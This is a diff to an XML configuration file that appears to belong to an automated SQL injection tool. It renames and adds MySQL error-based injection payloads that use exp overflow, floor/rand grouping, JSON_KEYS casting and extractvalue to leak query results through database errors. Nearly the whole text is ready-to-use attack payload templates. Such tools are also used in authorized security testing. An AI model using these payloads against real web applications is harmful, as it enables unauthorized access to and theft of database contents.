@@ -181,16 +181,16 @@ as char)
         </boolean>
         <error>
             <method>
-                <name>BigInt Overflow</name>
+                <name>BIGINT::exp</name>
                 <query>
 and 1 = exp(~(select*from(
     ${WINDOW}
 )x))
                 </query>
-                <capacity>65536</capacity>
+                <capacity>64</capacity>
             </method>
             <method>
-                <name>Floor Rand</name>
+                <name>GROUPBY::floor_rand</name>
                 <query>
 or exists(
     select
@@ -204,6 +204,25 @@ or exists(
 )
                 </query>
                 <capacity>64</capacity>
+            </method>
+            <method>
+                <name>JSON::json_keys</name>
+                <query>
+/* Require FALSE statement, then OR */
+and 1=0 or 1 = (select JSON_KEYS(cast((select*from(
+    ${WINDOW}
+)x)as char)))
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>XML::extractvalue</name>
+                <query>
+and 1 = extractvalue(0x0a,concat(0x0a,(
+    ${WINDOW}
+)))
+                </query>
+                <capacity>99</capacity>
             </method>
         </error>
     </strategy>
